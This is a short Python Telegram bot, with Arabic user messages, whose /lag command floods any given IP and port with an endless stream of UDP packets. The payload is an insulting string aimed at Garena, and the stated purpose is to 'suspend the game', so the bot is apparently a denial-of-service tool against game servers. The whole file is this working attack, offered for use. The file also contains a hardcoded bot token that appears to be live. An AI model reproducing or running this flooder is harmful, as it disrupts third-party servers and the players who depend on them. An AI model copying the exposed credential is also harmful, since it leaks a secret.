from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import socket
import threading

def send_udp_packets(server_ip, server_port):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    message = "fuck_garena" * 99

    try:
        while True:
            udp_socket.sendto(message.encode(), (server_ip, server_port))
            print(f"تم إرسال البيانات إلى {server_ip}:{server_port}")
    except KeyboardInterrupt:
        print("تم إيقاف الإرسال بواسطة المستخدم.")
    finally:
        udp_socket.close()

async def lag(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    args = context.args
    if len(args) == 1 and ':' in args[0]:  # تأكد من أن المدخل يحتوي على ":" (IP و port)
        server_ip, server_port = args[0].split(':')
        try:
            server_port = int(server_port)
            await update.message.reply_text("جاري تعليق الجيم ...")
            threading.Thread(target=send_udp_packets, args=(server_ip, server_port)).start()
            #await update.message.reply_text(f"تم إرسال البيانات إلى {server_ip}:{server_port}")
        except ValueError:
            await update.message.reply_text("رقم المنفذ يجب أن يكون عدداً صحيحاً.")
    else:
        await update.message.reply_text("الرجاء إدخال عنوان IP ورقم المنفذ بالشكل الصحيح: IP:PORT")

def main() -> None:
    app = ApplicationBuilder().token("7739726654:AAH20QdVf4NsJDdkanCiFJ4B9c1CK5tH0jE").build()

    app.add_handler(CommandHandler("lag", lag))

    app.run_polling()

if __name__ == '__main__':
    main()
